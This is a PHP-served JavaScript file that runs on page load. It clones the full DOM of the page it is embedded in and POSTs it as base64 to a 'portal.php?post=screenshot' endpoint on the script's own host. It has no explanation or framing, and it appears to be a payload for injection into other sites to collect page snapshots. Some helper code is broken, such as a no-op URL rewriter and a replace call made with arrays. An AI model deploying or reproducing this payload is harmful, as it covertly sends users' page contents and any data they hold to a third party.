<?php header('Content-Type: application/javascript');?>
//<script>
(function (exports) {
    function urlsToAbsolute(nodeList) {
        if (!nodeList.length) {
            return [];
        }
        var attrName = 'href';
        if (nodeList[0].__proto__ === HTMLImageElement.prototype || nodeList[0].__proto__ === HTMLScriptElement.prototype) {
            attrName = 'src';
        }
        nodeList = [].map.call(nodeList, function (el, i) {
            var attr = el.getAttribute(attrName);
            if (!attr) {
                return;
            }
            var absURL = /^(https?|data):/i.test(attr);
            if (absURL) {
                return el;
            } else {
                return el;
            }
        });
        return nodeList;
    }

    function screenshotPage() {
        urlsToAbsolute(document.images);
        urlsToAbsolute(document.querySelectorAll("link[rel='stylesheet']"));
        var screenshot = document.documentElement.cloneNode(true);
        var b = document.createElement('base');
        b.href = document.location.protocol + '//' + location.host;
        var head = screenshot.querySelector('head');
        head.insertBefore(b, head.firstChild);
        screenshot.style.pointerEvents = 'none';
        screenshot.style.overflow = 'hidden';
        screenshot.style.webkitUserSelect = 'none';
        screenshot.style.mozUserSelect = 'none';
        screenshot.style.msUserSelect = 'none';
        screenshot.style.oUserSelect = 'none';
        screenshot.style.userSelect = 'none';
        screenshot.dataset.scrollX = window.scrollX;
        screenshot.dataset.scrollY = window.scrollY;
        var script = document.createElement('script');
        script.textContent = '(' + addOnPageLoad_.toString() + ')();';
        screenshot.querySelector('body').appendChild(script);
        var blob = new Blob([screenshot.outerHTML.replace([".location",".navigate","href","atob"],[".locationn",".navigatee","'hreff'","btoa"])], {
            type: 'text/html'
        });
        return blob;
    }

    function addOnPageLoad_() {
        window.addEventListener('DOMContentLoaded', function (e) {
            var scrollX = document.documentElement.dataset.scrollX || 0;
            var scrollY = document.documentElement.dataset.scrollY || 0;
            window.scrollTo(scrollX, scrollY);
        });
    }

    function generate() {
        window.URL = window.URL || window.webkitURL;
        window.URL.createObjectURL(screenshotPage());
    }
    exports.screenshotPage = screenshotPage;
    exports.generate = generate;
})(window);

function ajaxReq( url, callback, method = 'GET', data = '' ){
  method = method.toUpperCase();
  var method_map = {'GET':'GET', 'POST':'POST', 'SCRIPT':'SCRIPT'};
  method = method_map[method] || 'GET';
  var xhr = new XMLHttpRequest();
  xhr.open(method, url);
  if(method == 'POST') {
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  }
  xhr.onload = function() {
    if (xhr.status === 200) {
      callback(xhr.responseText);
    }
    else {
        console.log('Request failed.  Returned status of ' + xhr.status);
    }
  };
  if(method == 'POST') {
    var query = "";
    for (key in data) {
      query += encodeURIComponent(key)+"="+encodeURIComponent(data[key])+"&";
    }
    query = query.substring(0, query.length - 1);
    xhr.send(query);
  } else {
    xhr.send();
  }
}
var host_url = "<?='//'.$_SERVER['HTTP_HOST'].str_replace('/js/screenshot.php', '', $_SERVER['PHP_SELF'])?>";
var img = screenshotPage();
var reader = new FileReader();
reader.readAsDataURL(img);
reader.onloadend = function() {
   var base64data = reader.result;
   ajaxReq( host_url + '/portal.php?post=screenshot', function(x){}, 'POST', { img: base64data } )
}
